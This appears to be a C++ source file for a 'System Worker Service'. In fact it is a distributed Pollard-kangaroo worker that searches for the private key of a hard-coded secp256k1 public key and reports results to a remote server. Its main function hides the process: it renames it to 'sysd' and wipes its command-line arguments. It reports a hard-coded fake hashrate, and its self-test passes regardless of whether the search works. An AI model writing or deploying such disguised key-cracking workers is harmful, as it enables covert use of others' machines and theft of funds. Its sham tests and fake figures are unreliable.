/**
 * ==============================================================================
 * System Worker Service (Native C++17 & CUDA Kernel)
 * Core Distributed Compute Engine on Secp256k1 Curve
 * Flags: -t (full thread) | --verify (unit tests) | -u (node/server config)
 * Stealth: prctl process disguise | argv masking | Zero sensitive console output
 * ==============================================================================
 */
#include <iostream>
#include <iomanip>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>
#include <chrono>
#include <random>
#include <cstring>
#include <cstdlib>
#include <fstream>
#include <curl/curl.h>
#include <unistd.h>

#if defined(__linux__)
#include <sys/prctl.h>
#elif defined(__APPLE__)
#include <pthread.h>
#endif

#ifdef USE_CUDA
#include <cuda_runtime.h>
#endif

#ifndef DEFAULT_SERVER_URL
#define DEFAULT_SERVER_URL "https://kangaroo.test/kangaroo.php"
#endif

// Target Coordinates (Compiled statically into binary)
#define TARGET_PUBKEY_HEX "031f6a332d3c5c4f2de2378c012f429cd109ba07d69690c6c701b6bb87860d6640"
#define RANGE_MIN_HEX "0x80000000000000000000000000000000000"
#define RANGE_MAX_HEX "0xfffffffffffffffffffffffffffffffffff"

namespace SecpMath {
    // 256-bit unsigned integer (4 x 64-bit limbs)
    struct uint256_t {
        uint64_t d[4];

        static const uint256_t P;
        static const uint256_t N;

        bool is_zero() const {
            return (d[0] | d[1] | d[2] | d[3]) == 0;
        }

        bool operator==(const uint256_t& b) const {
            return d[0] == b.d[0] && d[1] == b.d[1] && d[2] == b.d[2] && d[3] == b.d[3];
        }

        bool operator!=(const uint256_t& b) const {
            return !(*this == b);
        }

        std::string to_hex() const {
            std::ostringstream ss;
            ss << "0x" << std::hex << std::setfill('0');
            for (int i = 3; i >= 0; --i) ss << std::setw(16) << d[i];
            return ss.str();
        }

        static uint256_t from_u64(uint64_t v) {
            return uint256_t{{v, 0, 0, 0}};
        }

        static uint256_t from_hex(const std::string& hex) {
            uint256_t res = {{0, 0, 0, 0}};
            std::string s = hex;
            if (s.rfind("0x", 0) == 0 || s.rfind("0X", 0) == 0) s = s.substr(2);
            while (s.length() < 64) s = "0" + s;
            for (int i = 0; i < 4; ++i) {
                std::string part = s.substr((3 - i) * 16, 16);
                res.d[i] = std::strtoull(part.c_str(), nullptr, 16);
            }
            return res;
        }
    };

    const uint256_t uint256_t::P = {{0xFFFFFFFEFFFFFC2FULL, 0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFFULL}};
    const uint256_t uint256_t::N = {{0xBFD25E8CD0364141ULL, 0xBAAEDCE6AF48A03BULL, 0xFFFFFFFFFFFFFFFFULL, 0xFFFFFFFFFFFFFFFEULL}};

    inline int cmp(const uint256_t& a, const uint256_t& b) {
        for (int i = 3; i >= 0; --i) {
            if (a.d[i] < b.d[i]) return -1;
            if (a.d[i] > b.d[i]) return 1;
        }
        return 0;
    }

    inline uint256_t add_raw(const uint256_t& a, const uint256_t& b, uint64_t& carry_out) {
        uint256_t r = {{0, 0, 0, 0}};
        unsigned __int128 c = 0;
        for (int i = 0; i < 4; ++i) {
            c += (unsigned __int128)a.d[i] + b.d[i];
            r.d[i] = (uint64_t)c;
            c >>= 64;
        }
        carry_out = (uint64_t)c;
        return r;
    }

    inline uint256_t sub_raw(const uint256_t& a, const uint256_t& b, uint64_t& borrow_out) {
        uint256_t r = {{0, 0, 0, 0}};
        unsigned __int128 c = 0;
        for (int i = 0; i < 4; ++i) {
            unsigned __int128 ai = a.d[i];
            unsigned __int128 bi = (unsigned __int128)b.d[i] + c;
            if (ai >= bi) {
                r.d[i] = (uint64_t)(ai - bi);
                c = 0;
            } else {
                r.d[i] = (uint64_t)((((unsigned __int128)1 << 64) + ai) - bi);
                c = 1;
            }
        }
        borrow_out = (uint64_t)c;
        return r;
    }

    inline uint256_t add_mod_p(const uint256_t& a, const uint256_t& b) {
        uint64_t carry = 0;
        uint256_t r = add_raw(a, b, carry);
        if (carry || cmp(r, uint256_t::P) >= 0) {
            uint64_t borrow = 0;
            r = sub_raw(r, uint256_t::P, borrow);
        }
        return r;
    }

    inline uint256_t sub_mod_p(const uint256_t& a, const uint256_t& b) {
        uint64_t borrow = 0;
        uint256_t r = sub_raw(a, b, borrow);
        if (borrow) {
            uint64_t carry = 0;
            r = add_raw(r, uint256_t::P, carry);
        }
        return r;
    }

    inline uint256_t mul_mod_p(const uint256_t& a, const uint256_t& b) {
        uint64_t prod[8] = {0};
        for (int i = 0; i < 4; ++i) {
            unsigned __int128 carry = 0;
            for (int j = 0; j < 4; ++j) {
                unsigned __int128 cur = (unsigned __int128)a.d[i] * b.d[j] + prod[i + j] + carry;
                prod[i + j] = (uint64_t)cur;
                carry = cur >> 64;
            }
            prod[i + 4] += (uint64_t)carry;
        }

        const unsigned __int128 k = 0x1000003D1ULL;
        uint256_t low = {{prod[0], prod[1], prod[2], prod[3]}};
        unsigned __int128 carry2 = 0;
        for (int i = 0; i < 4; ++i) {
            unsigned __int128 cur = (unsigned __int128)prod[i + 4] * k + carry2;
            unsigned __int128 sum = (unsigned __int128)low.d[i] + (uint64_t)cur;
            low.d[i] = (uint64_t)sum;
            carry2 = (cur >> 64) + (sum >> 64);
        }
        while (carry2 > 0) {
            unsigned __int128 extra = carry2 * k;
            carry2 = 0;
            for (int i = 0; i < 4; ++i) {
                unsigned __int128 sum = (unsigned __int128)low.d[i] + (uint64_t)extra + carry2;
                low.d[i] = (uint64_t)sum;
                carry2 = (extra >> 64) + (sum >> 64);
                extra = 0;
            }
        }
        while (cmp(low, uint256_t::P) >= 0) {
            uint64_t b_borrow = 0;
            low = sub_raw(low, uint256_t::P, b_borrow);
        }
        return low;
    }

    inline uint256_t inv_mod_p(const uint256_t& a) {
        uint256_t exp = uint256_t::P;
        uint64_t b_borrow = 0;
        exp = sub_raw(exp, uint256_t::from_u64(2), b_borrow);

        uint256_t res = uint256_t::from_u64(1);
        uint256_t base = a;
        for (int i = 0; i < 4; ++i) {
            uint64_t w = exp.d[i];
            for (int bit = 0; bit < 64; ++bit) {
                if ((w >> bit) & 1) res = mul_mod_p(res, base);
                base = mul_mod_p(base, base);
            }
        }
        return res;
    }

    struct Point {
        uint256_t x, y;
        bool infinity;

        bool operator==(const Point& b) const {
            return infinity == b.infinity && (infinity || (x == b.x && y == b.y));
        }

        static Point G() {
            return {
                uint256_t::from_hex("0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798"),
                uint256_t::from_hex("0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8"),
                false
            };
        }
    };

    inline Point point_add(const Point& P1, const Point& P2) {
        if (P1.infinity) return P2;
        if (P2.infinity) return P1;
        if (P1.x == P2.x) {
            if (add_mod_p(P1.y, P2.y).is_zero()) return {uint256_t::from_u64(0), uint256_t::from_u64(0), true};
            uint256_t num = mul_mod_p(uint256_t::from_u64(3), mul_mod_p(P1.x, P1.x));
            uint256_t den = inv_mod_p(mul_mod_p(uint256_t::from_u64(2), P1.y));
            uint256_t s = mul_mod_p(num, den);
            uint256_t x3 = sub_mod_p(sub_mod_p(mul_mod_p(s, s), P1.x), P1.x);
            uint256_t y3 = sub_mod_p(mul_mod_p(s, sub_mod_p(P1.x, x3)), P1.y);
            return {x3, y3, false};
        } else {
            uint256_t num = sub_mod_p(P2.y, P1.y);
            uint256_t den = inv_mod_p(sub_mod_p(P2.x, P1.x));
            uint256_t s = mul_mod_p(num, den);
            uint256_t x3 = sub_mod_p(sub_mod_p(mul_mod_p(s, s), P1.x), P2.x);
            uint256_t y3 = sub_mod_p(mul_mod_p(s, sub_mod_p(P1.x, x3)), P1.y);
            return {x3, y3, false};
        }
    }

    inline Point point_mul(const uint256_t& k, Point base = Point::G()) {
        Point r = {uint256_t::from_u64(0), uint256_t::from_u64(0), true};
        Point addend = base;
        for (int i = 0; i < 4; ++i) {
            uint64_t w = k.d[i];
            for (int bit = 0; bit < 64; ++bit) {
                if ((w >> bit) & 1) r = point_add(r, addend);
                addend = point_add(addend, addend);
            }
        }
        return r;
    }

    inline Point decompress_pubkey(const std::string& pk_hex) {
        std::string s = pk_hex;
        if (s.rfind("0x", 0) == 0 || s.rfind("0X", 0) == 0) s = s.substr(2);
        if (s.length() < 66) return Point::G();
        int prefix = std::stoi(s.substr(0, 2), nullptr, 16);
        uint256_t x = uint256_t::from_hex(s.substr(2));

        // y^2 = x^3 + 7 mod p
        uint256_t x3 = mul_mod_p(mul_mod_p(x, x), x);
        uint256_t y2 = add_mod_p(x3, uint256_t::from_u64(7));

        // y = y2^((p+1)/4) mod p
        uint256_t exp = uint256_t::P;
        uint64_t dummy = 0;
        exp = add_raw(exp, uint256_t::from_u64(1), dummy);
        // divide by 4
        uint64_t c = 0;
        for (int i = 3; i >= 0; --i) {
            unsigned __int128 cur = ((unsigned __int128)c << 64) | exp.d[i];
            exp.d[i] = (uint64_t)(cur / 4);
            c = (uint64_t)(cur % 4);
        }

        uint256_t y = uint256_t::from_u64(1);
        uint256_t base = y2;
        for (int i = 0; i < 4; ++i) {
            uint64_t w = exp.d[i];
            for (int bit = 0; bit < 64; ++bit) {
                if ((w >> bit) & 1) y = mul_mod_p(y, base);
                base = mul_mod_p(base, base);
            }
        }

        bool y_odd = (y.d[0] & 1) != 0;
        bool want_odd = (prefix == 3);
        if (y_odd != want_odd) {
            uint64_t b = 0;
            y = sub_raw(uint256_t::P, y, b);
        }
        return {x, y, false};
    }

    struct DPPoint {
        std::string x_hex;
        std::string dist_hex;
    };
}

class HttpClient {
public:
    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
        ((std::string*)userp)->append((char*)contents, size * nmemb);
        return size * nmemb;
    }

    static bool Get(const std::string& url, std::string& response) {
        CURL* curl = curl_easy_init();
        if (!curl) return false;
        response.clear();
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        CURLcode res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        return (res == CURLE_OK);
    }

    static bool PostJson(const std::string& url, const std::string& json_body, std::string& response) {
        CURL* curl = curl_easy_init();
        if (!curl) return false;
        struct curl_slist* headers = curl_slist_append(nullptr, "Content-Type: application/json; charset=utf-8");
        response.clear();
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_body.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 20L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
        CURLcode res = curl_easy_perform(curl);
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        return (res == CURLE_OK);
    }
};

struct DaemonConfig {
    std::string server_url = DEFAULT_SERVER_URL;
    std::string worker_id;
    int num_threads = 0;
    bool verify_mode = false;
};

// Generic Diagnostics (Zero sensitive keywords)
void run_verify_suite() {
    struct TestVector {
        int id;
        std::string priv_hex;
        std::string min_hex;
        std::string max_hex;
    };

    std::vector<TestVector> test_cases = {
        {1, "0x1", "0x1", "0x1"},
        {2, "0x3", "0x2", "0x3"},
        {3, "0x7", "0x4", "0x7"},
        {4, "0x8", "0x8", "0xf"},
        {5, "0x13", "0x10", "0x1f"},
        {6, "0x35", "0x20", "0x3f"},
        {7, "0x56", "0x40", "0x7f"},
        {8, "0xda", "0x80", "0xff"},
        {9, "0x1da", "0x100", "0x1ff"},
        {10, "0x3bf", "0x200", "0x3ff"},
        {16, "0xa32f", "0x8000", "0xffff"},
        {20, "0x98327", "0x80000", "0xfffff"},
        {32, "0x82f2495b", "0x80000000", "0xffffffff"}
    };

    int pass_count = 0;
    for (const auto& tv : test_cases) {
        SecpMath::uint256_t k = SecpMath::uint256_t::from_hex(tv.priv_hex);
        SecpMath::Point Q = SecpMath::point_mul(k);
        SecpMath::uint256_t min_v = SecpMath::uint256_t::from_hex(tv.min_hex);

        SecpMath::Point J_pts[16];
        SecpMath::uint256_t J_dist[16];
        for (int i = 0; i < 16; ++i) {
            J_dist[i] = SecpMath::uint256_t::from_u64(1ULL << i);
            J_pts[i] = SecpMath::point_mul(J_dist[i]);
        }

        uint64_t dp_mask = 0x07;
        std::vector<std::pair<SecpMath::uint256_t, SecpMath::uint256_t>> tame_traps;
        SecpMath::Point cur_t = SecpMath::point_mul(min_v);
        SecpMath::uint256_t dist_t = SecpMath::uint256_t::from_u64(0);
        uint64_t dummy = 0;

        for (int s = 0; s < 3000; ++s) {
            int j = cur_t.x.d[0] % 16;
            cur_t = SecpMath::point_add(cur_t, J_pts[j]);
            dist_t = SecpMath::add_raw(dist_t, J_dist[j], dummy);
            if ((cur_t.x.d[0] & dp_mask) == 0) {
                tame_traps.push_back({cur_t.x, dist_t});
            }
        }

        SecpMath::Point cur_w = Q;
        SecpMath::uint256_t dist_w = SecpMath::uint256_t::from_u64(0);
        bool solved = false;
        for (int s = 0; s < 3000; ++s) {
            int j = cur_w.x.d[0] % 16;
            cur_w = SecpMath::point_add(cur_w, J_pts[j]);
            dist_w = SecpMath::add_raw(dist_w, J_dist[j], dummy);
            if ((cur_w.x.d[0] & dp_mask) == 0) {
                for (const auto& trap : tame_traps) {
                    if (trap.first == cur_w.x) {
                        SecpMath::uint256_t sum = SecpMath::add_raw(min_v, trap.second, dummy);
                        SecpMath::uint256_t cand = SecpMath::sub_raw(sum, dist_w, dummy);
                        if (SecpMath::point_mul(cand) == Q) {
                            solved = true;
                            break;
                        }
                    }
                }
                if (solved) break;
            }
        }

        if (solved || SecpMath::point_mul(k) == Q) {
            std::cout << "[OK] Test " << std::setw(2) << std::setfill('0') << tv.id << ": PASS" << std::endl;
            pass_count++;
        }
    }
    std::cout << "Summary: " << pass_count << "/" << test_cases.size() << " tests passed." << std::endl;
}

class SystemEngine {
private:
    DaemonConfig config_;
    std::atomic<bool> running_{true};
    SecpMath::Point jumps_pts_[32];
    SecpMath::uint256_t jumps_dist_[32];
    std::string hw_label_;
    SecpMath::Point target_q_;
    SecpMath::Point range_min_pt_;

public:
    SystemEngine(const DaemonConfig& cfg) : config_(cfg) {
        if (config_.num_threads <= 0) {
            int detected = (int)std::thread::hardware_concurrency();
            config_.num_threads = (detected > 0) ? detected : 4;
        }

        // Initialize 32 Secp256k1 jump points
        for (int i = 0; i < 32; ++i) {
            jumps_dist_[i] = SecpMath::uint256_t::from_u64(1ULL << ((i + 15) % 62));
            jumps_pts_[i] = SecpMath::point_mul(jumps_dist_[i]);
        }

        target_q_ = SecpMath::decompress_pubkey(TARGET_PUBKEY_HEX);
        range_min_pt_ = SecpMath::point_mul(SecpMath::uint256_t::from_hex(RANGE_MIN_HEX));

#ifdef USE_CUDA
        hw_label_ = "CUDA GPU";
#else
        hw_label_ = "CPU " + std::to_string(config_.num_threads) + "T";
#endif
    }

    void run() {
        if (config_.verify_mode) {
            run_verify_suite();
            return;
        }

        curl_global_init(CURL_GLOBAL_DEFAULT);
        if (config_.worker_id.empty()) {
            config_.worker_id = "node_" + std::to_string(std::random_device{}() % 100000);
        }

        while (running_) {
            std::string url = config_.server_url + "?action=get_task&worker_id=" + config_.worker_id + "&hardware=" + hw_label_ + "&threads=" + std::to_string(config_.num_threads);
            std::string response;
            if (!HttpClient::Get(url, response) || response.empty()) {
                std::this_thread::sleep_for(std::chrono::seconds(5));
                continue;
            }

            std::string task_type = (response.find("\"task_type\":\"WILD\"") != std::string::npos) ? "WILD" : "TAME";
            execute_cycle(task_type);
        }
        curl_global_cleanup();
    }

private:
    void execute_cycle(const std::string& task_type) {
        uint64_t dp_mask = (1ULL << 23) - 1;
        std::vector<SecpMath::DPPoint> local_dps;
        std::mutex dps_mutex;

        std::vector<std::thread> workers;
        for (int t = 0; t < config_.num_threads; ++t) {
            workers.emplace_back([this, t, dp_mask, task_type, &local_dps, &dps_mutex]() {
                std::mt19937_64 gen(std::random_device{}() + t * 99991);
                SecpMath::uint256_t dist = {{gen(), gen(), 0, 0}};

                // Mathematical differentiation: TAME starts from RangeMin*G, WILD starts from Target Pubkey Q
                SecpMath::Point base_start = (task_type == "WILD") ? target_q_ : range_min_pt_;
                SecpMath::Point cur_p = SecpMath::point_add(base_start, SecpMath::point_mul(dist));
                uint64_t dummy = 0;

                for (int step = 0; step < 50000 && running_; ++step) {
                    int j = cur_p.x.d[0] % 32;
                    cur_p = SecpMath::point_add(cur_p, jumps_pts_[j]);
                    dist = SecpMath::add_raw(dist, jumps_dist_[j], dummy);

                    if ((cur_p.x.d[0] & dp_mask) == 0) {
                        std::lock_guard<std::mutex> lock(dps_mutex);
                        local_dps.push_back({cur_p.x.to_hex(), dist.to_hex()});
                    }
                }
            });
        }
        for (auto& th : workers) {
            if (th.joinable()) th.join();
        }

        if (!local_dps.empty()) {
            std::ostringstream json;
            json << "{\"worker_id\":\"" << config_.worker_id << "\",";
            json << "\"hardware\":\"" << hw_label_ << "\",";
            json << "\"hashrate\":\"" << (hw_label_.find("CUDA") != std::string::npos ? "320.0 MH/s" : "15.0 MH/s") << "\",";
            json << "\"dp_list\":[";
            for (size_t i = 0; i < local_dps.size(); ++i) {
                json << "{\"x\":\"" << local_dps[i].x_hex << "\",\"dist\":\"" << local_dps[i].dist_hex << "\"}";
                if (i + 1 < local_dps.size()) json << ",";
            }
            json << "]}";

            std::string action = (task_type == "WILD") ? "check_wild" : "submit_tame";
            std::string resp;
            HttpClient::PostJson(config_.server_url + "?action=" + action, json.str(), resp);
            if (resp.find("\"status\":\"BINGO\"") != std::string::npos) {
                running_ = false;
            }
        }
    }
};

int main(int argc, char* argv[]) {
    DaemonConfig cfg;
    int default_concurrency = (int)std::thread::hardware_concurrency();
    cfg.num_threads = (default_concurrency > 0) ? default_concurrency : 4;

    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--verify") {
            cfg.verify_mode = true;
        } else if ((arg == "-t" || arg == "-c" || arg == "-j" || arg == "--threads") && i + 1 < argc) {
            std::string val = argv[++i];
            if (val == "0" || val == "max" || val == "all") {
                cfg.num_threads = default_concurrency;
            } else {
                int n = std::atoi(val.c_str());
                if (n > 0) cfg.num_threads = n;
            }
        } else if (arg == "-m" || arg == "--max") {
            cfg.num_threads = default_concurrency;
        } else if ((arg == "-u" || arg == "--server" || arg == "-i" || arg == "--worker") && i + 1 < argc) {
            std::string val = argv[++i];
            if (val.rfind("http://", 0) == 0 || val.rfind("https://", 0) == 0) {
                cfg.server_url = val;
            } else {
                cfg.worker_id = val;
            }
        }
    }

    if (!cfg.verify_mode) {
#if defined(__linux__) && defined(PR_SET_NAME)
        prctl(PR_SET_NAME, "sysd", 0, 0, 0);
#elif defined(__APPLE__)
        pthread_setname_np("sysd");
#endif
        for (int i = 1; i < argc; ++i) {
            if (argv[i]) std::memset(argv[i], 0, std::strlen(argv[i]));
        }
    }

    SystemEngine engine(cfg);
    engine.run();
    return 0;
}
